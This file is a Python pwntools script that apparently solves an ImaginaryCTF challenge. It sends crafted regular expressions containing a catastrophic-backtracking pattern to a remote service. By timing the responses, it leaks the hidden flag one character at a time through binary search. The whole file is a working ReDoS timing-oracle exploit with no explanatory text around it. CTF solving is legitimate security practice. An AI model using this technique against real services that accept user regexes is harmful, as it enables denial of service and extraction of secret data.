from pwn import *
from re import *
import string

address = "puzzler7.imaginaryctf.org"
port = 7006
conn = remote(address, port)
conn.recvuntil(bytes("Enter your regex: ", 'ascii'))

bad = "((?:.*)+) "
conn.recv()

def try_range(flag, l):
    x = '[' + escape(''.join(l)) + ']'

    regex = "(" + escape(flag) + x + ".*)|" + bad
    print(flag, regex)

    conn.send(bytes(regex + '\n', 'ascii'))

    s = time.time()
    conn.recvuntil(bytes("Enter your regex: ", 'ascii'))
    e = time.time()

    return e - s < 0.5

def sol():
    flag = "ictf{"
    while True:
        i = string.printable[:-6]
        high = len(i)
        low = 0
        c = None
        while high > low:
            mid = (high + low) // 2
            print(high, low, mid)
            if (high - low) == 1: # hack lol
                c = i[low]
                break
            print("Trying Left: ")
            r = try_range(flag, i[low:mid])
            print(r)
            if r:
                high = mid
                continue
            print("Trying Right: ")
            r = try_range(flag, i[mid:high])
            print(r)
            if r:
                low = mid
        if c:
            flag += c
        if c == '}':
            break
    return flag

print(sol())
